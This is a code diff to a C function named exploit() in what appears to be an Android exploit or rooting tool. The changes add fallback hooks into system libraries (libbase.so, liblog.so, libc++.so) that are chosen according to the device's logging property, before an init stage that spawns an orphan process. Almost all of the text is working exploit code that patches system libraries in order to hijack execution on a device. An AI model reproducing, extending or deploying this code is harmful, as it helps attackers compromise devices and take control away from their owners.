@@ -555,7 +555,18 @@ static int exploit(void) {
     int rc = 3;
     if (patch_helper()) goto done;
     if (patch_ko()) goto done;
-    int hook_rc = patch_hook("/system/lib64/libc++.so",
+    char logtag[PROP_VALUE_MAX] = "";
+    __system_property_get("persist.log.tag", logtag);
+    int log_silenced = logtag[0] == 'S' || logtag[0] == 's';
+    if (log_silenced) printf("persist.log.tag=%s - preferring log-silence-safe hooks\n", logtag);
+    int hook_rc = 1;
+    if (log_silenced) { //sarah: this is for when logging doesnt work (e.g. using a Honor device)
+        hook_rc = patch_hook("/system/lib64/libbase.so", "_ZN7android4base9ShouldLogENS0_11LogSeverityEPKc", libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy, &g_libcxx_r);
+        if (hook_rc == 1) hook_rc = patch_hook("/system/lib64/libbase.so", "_ZN7android4base9ShouldLogENS0_5LogIdENS0_11LogSeverityEPKcS4_", libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy, &g_libcxx_r);
+        if (hook_rc == 1) hook_rc = patch_hook("/system/lib64/liblog.so", "__android_log_is_loggable", libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy, &g_libcxx_r);
+    }
+    if (hook_rc == 1)
+        hook_rc = patch_hook("/system/lib64/libc++.so",
                              "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
                              libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
                              &g_libcxx_r);
@@ -566,11 +577,16 @@ static int exploit(void) {
                              "_ZN7android4base10LogMessageD1Ev",
                              libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
                              &g_libcxx_r);
+    if (!log_silenced) {
+        if (hook_rc == 1) hook_rc = patch_hook("/system/lib64/libbase.so", "_ZN7android4base9ShouldLogENS0_11LogSeverityEPKc", libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy, &g_libcxx_r);
+        if (hook_rc == 1) hook_rc = patch_hook("/system/lib64/libbase.so", "_ZN7android4base9ShouldLogENS0_5LogIdENS0_11LogSeverityEPKcS4_", libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy, &g_libcxx_r);
+        if (hook_rc == 1) hook_rc = patch_hook("/system/lib64/liblog.so", "__android_log_is_loggable", libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy, &g_libcxx_r);
+    }
     if (hook_rc) goto done;
 
     rc = 2;
     usleep(500000);
-    
+
     printf("\n=== init  ===\n");
     createOrphanProcess();
 
